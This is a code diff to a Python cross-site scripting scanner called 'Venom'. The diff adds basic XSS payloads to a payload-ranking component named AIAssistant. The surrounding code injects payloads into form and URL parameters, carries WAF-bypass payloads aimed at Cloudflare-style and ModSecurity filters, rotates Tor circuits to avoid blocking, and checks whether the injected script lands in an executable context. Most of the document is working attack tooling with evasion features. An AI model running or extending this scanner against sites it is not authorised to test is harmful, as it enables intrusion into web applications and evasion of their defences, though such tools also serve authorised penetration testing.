@@ -315,6 +315,14 @@ class AIAssistant:
         executable_payloads = [p for p in self.payloads if any(x in p.lower() for x in ['alert(', 'on', 'confirm(', 'javascript:'])]
         other_payloads = [p for p in self.payloads if p not in executable_payloads]
         
+        # Prioritize basic XSS payloads
+        basic_payloads = [
+            "<script>alert('xss')</script>",
+            "<img src=x onerror=alert('xss')>",
+            "javascript:alert('xss')"
+        ]
+        prioritized = basic_payloads + executable_payloads
+        
         if waf_detected:
             bypass_payloads = [
                 "<scr"+"ipt>alert('xss')</script>",
@@ -327,10 +335,10 @@ class AIAssistant:
                 bypass_payloads.append("<input onpointerover=alert('xss')>")
             elif waf_type == "ModSecurity":
                 bypass_payloads.append("<script>/*foo*/alert('xss')/*bar*/</script>")
-            return bypass_payloads + executable_payloads[:20]
+            return bypass_payloads + prioritized[:20]
         
         if not response:
-            return executable_payloads + other_payloads[:20]
+            return prioritized + other_payloads[:20]
 
         with self.lock:
             if self.success_history and response:
@@ -339,13 +347,13 @@ class AIAssistant:
                 response_vector = tfidf_matrix[0]
                 similarities = cosine_similarity(response_vector, tfidf_matrix[1:]).flatten()
                 sorted_payloads = sorted(
-                    executable_payloads,
+                    prioritized,
                     key=lambda p: self.success_history.get(p, {"weight": 0.0})["weight"] + 
                                   (similarities[list(self.success_history.keys()).index(p)] if p in self.success_history else 0),
                     reverse=True
                 )
             else:
-                sorted_payloads = executable_payloads
+                sorted_payloads = prioritized
             
             html_context = '<input' in response or '<form' in response or '<textarea' in response
             js_context = '<script' in response or 'javascript:' in response or 'onload' in response
@@ -578,7 +586,7 @@ class Venom:
         self.use_403_bypass = args.use_403_bypass
         self.is_waf_detected = False
         self.active_params = []
-        self.extra_params = args.extra_params.split(',') if args.extra_params else ['email', 'id', 'search', 'name', 'username', 'message']
+        self.extra_params = args.extra_params.split(',') if args.extra_params else ['email', 'id', 'search', 'name', 'username', 'message', 'test']
         self.subdomains = self.load_subdomains() if args.subdomains else []
         self.rate_limit_detected = False
         self.dns_failure_count = 0
@@ -785,7 +793,7 @@ class Venom:
         return data
 
     def extract_params(self, url: str, response_text: str) -> List[str]:
-        params = set(parse_qs(urlparse(url).query).keys())
+        params = set(parse_qs(urlparse(url).query).keys())  # Include initial URL query params
         soup = BeautifulSoup(response_text, 'html.parser')
         for tag in soup.find_all(['input', 'textarea', 'select', 'button', 'a']):
             if tag.get('name'):
@@ -807,7 +815,7 @@ class Venom:
         for extra_param in self.extra_params:
             params.add(extra_param)
         self.active_params = list(params)
-        logging.debug(f"Extracted {len(self.active_params)} parameters from {url}")
+        logging.debug(f"Extracted {len(self.active_params)} parameters from {url}: {self.active_params}")
         return self.active_params
 
     def inject_payload(self, url: str, method: str, payload: str, param: str = None, data: Dict[str, str] = None) -> tuple[Optional[str], int]:
@@ -829,7 +837,7 @@ class Venom:
                     if param:
                         data[param] = payload
                     response = self.session.post(url, data=data, timeout=self.args.timeout)
-                logging.debug(f"Injected payload {payload} into {url} ({method}) - Status: {response.status_code}")
+                logging.debug(f"Injected payload '{payload}' into {url} ({method}) - Status: {response.status_code}")
                 if response.status_code in [403, 429] and not self.is_waf_detected:
                     self.is_waf_detected = True
                     self.waf_ips_status = f"WAF/IPS detected during scan (status: {response.status_code})"
@@ -917,7 +925,7 @@ class Venom:
                 time.sleep(random.uniform(self.args.min_delay, self.args.max_delay))
 
             with ThreadPoolExecutor(max_workers=min(10, self.args.workers)) as executor:
-                futures = [executor.submit(test_payload, param, payload) for param in params for payload in payloads]
+                futures = [executor.submit(test_payload, param, payload) for param in params for payload in payloads[:50]]  # Limit to 50 payloads for testing
                 for future in futures:
                     try:
                         future.result()
@@ -944,7 +952,7 @@ class Venom:
                 try:
                     self.task_queue.task_done()
                 except ValueError:
-                    pass  # Queue might already be marked done
+                    pass
                 if self.args.use_tor and "NameResolutionError" in str(e):
                     reset_tor_circuit()
 
@@ -1081,13 +1089,13 @@ def is_reflected(payload: str, response_text: str, soup: BeautifulSoup) -> tuple
     if not payload.strip():
         return False, "Empty payload"
 
-    # Check for full payload reflection first
+    # Check for full payload reflection
     if payload in response_text and html.escape(payload) != payload:
         # Check executable contexts
         script_tags = soup.find_all('script')
         for script in script_tags:
             script_text = script.get_text()
-            if payload in script_text and not script.get('src'):  # Ignore <script src="...">
+            if payload in script_text and not script.get('src'):  # Dynamic <script> tags
                 return True, "Inside <script> tag (executable)"
 
         for tag in soup.find_all(True):
@@ -1097,14 +1105,14 @@ def is_reflected(payload: str, response_text: str, soup: BeautifulSoup) -> tuple
                 elif attr in ['href', 'src', 'data'] and 'javascript:' in value.lower() and payload in value:
                     return True, f"Inside {attr} attribute (javascript:)"
 
-        # Check for unescaped HTML injection
+        # Check for unescaped HTML injection in body
         if any(c in payload for c in '<>"\'') and payload in response_text:
-            return True, "Unescaped in HTML"
+            return True, "Unescaped in HTML (potential injection)"
 
         logging.debug(f"Payload '{payload}' found but not in executable context")
         return False, "Reflected but not executable"
 
-    # Check for significant executable portions (e.g., alert(), javascript:)
+    # Check for significant executable portions
     executable_patterns = [
         r'alert\(.+\)', r'javascript:[^"]+', r'on[a-z]+\s*=\s*["\'][^"\']+["\']'
     ]
